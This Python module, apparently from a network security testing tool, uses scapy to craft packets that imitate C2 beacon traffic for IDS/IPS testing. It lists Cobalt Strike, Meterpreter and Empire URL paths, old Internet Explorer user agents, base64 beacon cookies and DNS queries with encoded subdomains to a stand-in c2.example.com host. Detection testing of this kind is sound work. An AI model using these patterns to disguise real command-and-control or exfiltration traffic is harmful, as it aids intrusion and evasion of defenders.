"""Command and Control (C2) beacon pattern traffic module."""

import base64
import random
import string
from typing import Iterator

from scapy.layers.inet import IP, TCP, UDP
from scapy.layers.dns import DNS, DNSQR
from scapy.packet import Packet, Raw

from netsec_tester.modules.base import ModuleInfo, TrafficCategory, TrafficModule


# C2 beacon patterns and indicators
C2_PATTERNS = [
    # Cobalt Strike beacon patterns
    {
        "name": "CobaltStrike-HTTP",
        "type": "http",
        "path": "/pixel.gif",
        "cookie_pattern": "SESSIONID=",
        "interval": True,
    },
    {
        "name": "CobaltStrike-HTTPS",
        "type": "http",
        "path": "/__utm.gif",
        "user_agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
    },
    # Metasploit Meterpreter patterns
    {
        "name": "Meterpreter-Reverse",
        "type": "http",
        "path": "/INITM",
        "method": "POST",
    },
    # Empire C2
    {
        "name": "Empire-Stager",
        "type": "http",
        "path": "/login/process.php",
        "cookie_pattern": "session=",
    },
    # Generic beacon patterns
    {
        "name": "Beacon-Base64-Cookie",
        "type": "http",
        "path": "/status",
        "base64_cookie": True,
    },
    {
        "name": "Beacon-Encoded-Param",
        "type": "http",
        "path": "/update",
        "encoded_param": True,
    },
    # DNS-based C2
    {
        "name": "DNS-TXT-C2",
        "type": "dns",
        "query_type": "TXT",
        "subdomain_pattern": "base64",
    },
    {
        "name": "DNS-A-C2",
        "type": "dns",
        "query_type": "A",
        "subdomain_pattern": "hex",
    },
]

# Known C2 framework User-Agents
C2_USER_AGENTS = [
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)",
    "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 5.2)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
]

# Suspicious paths often used by C2
C2_PATHS = [
    "/pixel.gif",
    "/pixel",
    "/__utm.gif",
    "/ga.js",
    "/fwlink",
    "/submit.php",
    "/upload.php",
    "/gate.php",
    "/admin/config.php",
    "/images/logo.gif",
    "/static/image.png",
    "/api/v1/callback",
    "/beacon",
    "/heartbeat",
]


class C2BeaconModule(TrafficModule):
    """Traffic module for C2 beacon patterns.

    Generates traffic that mimics Command and Control communication
    patterns to trigger IPS/IDS detection.
    """

    def __init__(self) -> None:
        """Initialize the C2 beacon module."""
        self._pattern_index = 0
        self._beacon_count = 0

    def get_info(self) -> ModuleInfo:
        """Return module information."""
        return ModuleInfo(
            name="c2_beacon",
            description="Command & Control beacon patterns for IPS/IDS testing",
            category=TrafficCategory.IPS_IDS,
            protocols=["TCP", "UDP", "HTTP", "DNS"],
            ports=[80, 443, 53, 8080, 8443],
        )

    def _generate_random_string(self, length: int) -> str:
        """Generate a random string."""
        return "".join(random.choices(string.ascii_letters + string.digits, k=length))

    def _generate_beacon_id(self) -> str:
        """Generate a beacon-like identifier."""
        # Mimics beacon session IDs
        return base64.b64encode(
            f"{random.randint(1000, 9999)}-{self._generate_random_string(8)}".encode()
        ).decode()

    def generate_packets(
        self,
        src_ip: str,
        dst_ip: str,
        dst_port: int | None = None,
    ) -> Iterator[Packet]:
        """Generate C2 beacon packets.

        Args:
            src_ip: Source IP address
            dst_ip: Destination IP address
            dst_port: Destination port

        Yields:
            Scapy packets with C2 beacon patterns
        """
        pattern = C2_PATTERNS[self._pattern_index % len(C2_PATTERNS)]
        self._pattern_index += 1
        self._beacon_count += 1

        if pattern["type"] == "dns":
            # Generate DNS-based C2 traffic
            yield from self._generate_dns_c2(src_ip, dst_ip, pattern)
        else:
            # Generate HTTP-based C2 traffic
            yield from self._generate_http_c2(src_ip, dst_ip, dst_port or 80, pattern)

    def _generate_http_c2(
        self,
        src_ip: str,
        dst_ip: str,
        port: int,
        pattern: dict,
    ) -> Iterator[Packet]:
        """Generate HTTP-based C2 beacon traffic."""
        method = pattern.get("method", "GET")
        path = pattern.get("path", random.choice(C2_PATHS))
        user_agent = pattern.get("user_agent", random.choice(C2_USER_AGENTS))

        # Build headers
        headers = [
            f"Host: {dst_ip}",
            f"User-Agent: {user_agent}",
            "Accept: */*",
            "Accept-Language: en-US,en;q=0.5",
            "Connection: keep-alive",
        ]

        # Add beacon-like cookie
        if pattern.get("cookie_pattern"):
            cookie_value = pattern["cookie_pattern"] + self._generate_beacon_id()
            headers.append(f"Cookie: {cookie_value}")
        elif pattern.get("base64_cookie"):
            # Encode fake command data in cookie
            cmd_data = f"cmd={self._beacon_count}&id={random.randint(1, 1000)}"
            encoded = base64.b64encode(cmd_data.encode()).decode()
            headers.append(f"Cookie: session={encoded}")

        # Build body for POST requests
        body = ""
        if method == "POST":
            if pattern.get("encoded_param"):
                # Encoded beacon data in POST body
                beacon_data = f"id={random.randint(1, 1000)}&data={self._generate_random_string(32)}"
                body = base64.b64encode(beacon_data.encode()).decode()
            else:
                body = f"status=ok&id={self._beacon_count}"
            headers.append(f"Content-Length: {len(body)}")
            headers.append("Content-Type: application/x-www-form-urlencoded")

        # Construct HTTP request
        http_request = f"{method} {path} HTTP/1.1\r\n"
        http_request += "\r\n".join(headers)
        http_request += "\r\n\r\n"
        if body:
            http_request += body

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=40000 + (self._beacon_count % 25000), dport=port, flags="PA")
            / Raw(load=http_request.encode())
        )

        yield packet

    def _generate_dns_c2(
        self,
        src_ip: str,
        dst_ip: str,
        pattern: dict,
    ) -> Iterator[Packet]:
        """Generate DNS-based C2 traffic."""
        query_type = pattern.get("query_type", "TXT")
        subdomain_pattern = pattern.get("subdomain_pattern", "base64")

        # Generate suspicious subdomain
        if subdomain_pattern == "base64":
            # Base64-like subdomain (data exfiltration pattern)
            data = self._generate_random_string(16)
            subdomain = base64.b64encode(data.encode()).decode().replace("=", "")
        elif subdomain_pattern == "hex":
            # Hex-encoded subdomain
            data = self._generate_random_string(8)
            subdomain = data.encode().hex()
        else:
            subdomain = self._generate_random_string(32)

        # Build DNS query
        domain = f"{subdomain}.c2.example.com"

        # Determine query type code
        qtype_map = {"A": 1, "TXT": 16, "CNAME": 5, "MX": 15}
        qtype = qtype_map.get(query_type, 1)

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / UDP(sport=random.randint(49152, 65535), dport=53)
            / DNS(rd=1, qd=DNSQR(qname=domain, qtype=qtype))
        )

        yield packet

